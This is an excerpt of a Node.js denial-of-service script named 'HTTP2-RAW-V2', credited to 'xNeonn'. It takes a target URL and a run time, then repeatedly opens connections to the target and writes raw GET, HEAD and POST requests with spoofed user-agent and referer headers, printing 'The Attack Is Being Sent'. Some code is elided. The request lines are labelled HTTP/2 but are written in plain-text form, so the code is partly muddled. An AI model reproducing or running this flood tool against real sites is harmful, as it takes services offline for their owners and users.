...
if (process.argv.length <= 2) {
    console.log("node HTTP2-RAW-V2  <URL>  <Time>");
    console.log("HTTP-RAW [Added HTTP/2] By xNeonn");
    process.exit(-1);
}
...
var int = setInterval(() => {
    ...
    s.setTimeout(10000);
    for (var i = 0; i < 50; i++) {
        console.log('\x1b[38;5;220m The Attack Is Being Sent, Please Wait.......')
        ...
        s.write('GET ' + target + ' HTTP/2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + platform + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nReferer: ' + referer + '\r\n\r\n');
        s.write('HEAD ' + target + ' HTTP/2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + platform + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nReferer: ' + referer + '\r\n\r\n');
        s.write('POST ' + target + ' HTTP/2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + platform + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nReferer: ' + referer + '\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
...
setTimeout(() => {
    clearInterval(int);
    console.log('\x1b[38;5;196m The Attack Has Stopped.');
}, time * 1000);